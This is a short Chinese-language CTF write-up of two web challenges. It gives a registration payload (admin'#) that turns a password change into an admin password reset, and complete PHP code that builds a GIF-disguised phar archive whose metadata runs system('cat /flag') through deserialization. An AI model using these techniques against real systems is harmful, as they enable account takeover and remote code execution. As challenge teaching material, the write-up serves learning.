# Web

## 二次注入

简单的SQL注入，其实跟二次注入没啥关系（出题人给我发的文件名是twice injection被我误解了

### 解题方法

注册用户时使用注释符覆盖掉后面的查询语句，即

```sql

admin'#

```

然后修改密码的时候则会去修改admin的密码（因为后面的内容被注释掉了），就能轻松地拿到Flag

## 反序列化？

相信大家看到问号应该知道这道题主要考的不是反序列化了吧（不会真有人在纠结反序列化吧）

### 解题方法

先观察`vulnerable.php`啊，主页上都提示了，发现了一个很显然能导致RCE的类，下面有一个`file_exists`函数，不会有人真觉得这边是检查上传文件是否成功吧。`file_exists`函数再检查phar包的时候会将其解析，利用这点进行代码执行。

使用如下代码生成一个phar包（带上gif文件头，因为上传那边会检查），然后修改后缀名上传即可，然后使用phar协议`phar://upload/xxx.gif`即可拿到flag。
```php

<?php

class Flag
{
    private $code;

    function __construct($my_code)
    {
        $this->code = $my_code;
    }

    function __destruct()
    {
        eval($this->code);
    }
}



$phar = new Phar('phar1.phar');
$phar->stopBuffering();
$phar->setStub('GIF89a' . '<?php __HALT_COMPILER();?>');
$phar->addFromString('test.txt', 'test');
$object = new Flag("system('cat /flag');");
$phar->setMetadata($object);
$phar->stopBuffering();

```
